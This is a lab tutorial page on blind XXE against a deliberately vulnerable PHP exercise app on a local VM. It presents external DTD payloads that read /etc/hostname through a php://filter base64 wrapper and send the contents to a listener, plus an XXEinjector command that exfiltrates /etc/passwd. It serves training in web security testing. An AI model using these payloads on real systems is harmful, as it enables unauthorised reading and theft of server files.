---
title: "Blind XXE"
weight: 2
---

{{% notice note %}}
Make sure you are on the PHP site (`/php/`) for these exercises.
{{% /notice %}}

If we try the same blind exfil we did in the Java app.

DTD (`/home/vagrant/dtds/hostname.dtd`)

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:5000/?x=%file;'>">
%eval;
%exfil;
```

Payload

```xml
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://127.0.0.1:5000/hostname.dtd"> %xxe;
]>

<root>
  <name>XXE</name>
  <tel>(555) 555-1734</tel>
  <email>email</email>
  <password>pass</password>
</root>
```

It does not work. If we look at the error logs `/var/log/nginx/error.log` we see this:

![](/static/img/php_invalid_uri.png)

To get around this, php has the ability to encode the contents. So in this test we will using the following dtd:

DTD (`/home/vagrant/dtds/php_encode_etc_hostname.dtd`)

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:5000/?x=%file;'>">
%eval;
%exfil;
```

Notice how we are now using a php filter to encode the contents of the `/etc/hostname` file in base64. When we submit the payload:

```xml
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://127.0.0.1:5000/php_encode_etc_hostname.dtd"> %xxe;
]>
<root>
  <name>XXE</name>
  <tel>(555) 555-1734</tel>
  <email>email</email>
  <password>pass</password>
</root>
```

We see the following request to our webserver:

![](/static/img/php_encoded_hostname.png)

We can then base64 decode this and we get the hostname:

![](/static/img/php_decoded_hostname.png)

We can automate this process a bit using XXEinjector.

First we save an example request and include a mark (`XXEINJECTOR`) where XXEinjector should inject the DTD. (`/home/vagrant/test_files/php_xxeinjector_req.txt`)

```plaintext
POST /php/process.php HTTP/1.1
Host: localhost:8085
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 216
Origin: http://localhost:8085
DNT: 1
Connection: close
Referer: http://localhost:8085/php/

XXEINJECT
<root>
  <name>XXE</name>
  <tel>(555) 555-1734</tel>
  <email>email</email>
  <password>pass</password>
</root>
```

Using this file we tell XXEinjector to grab the contents of the `/etc/passwd` file, base64 encode it and then send it back to our http server listening on port `5005`.

```bash
ruby /home/vagrant/tools/XXEinjector/XXEinjector.rb --httpport=5005 --path=/etc/passwd --host=127.0.0.1 --file=/home/vagrant/test_files/hostname_req.txt --phpfilter --oob=http
```

This shows that we received some content as a response.

![](/static/img/php_xxeinjector.png)

To see the contents we will look in the `Logs` folder under the directory we ran the tool from. As we can see, the contents has been base64 decoded for us automatically.

![](/static/img/php_xxeinjector_results.png)
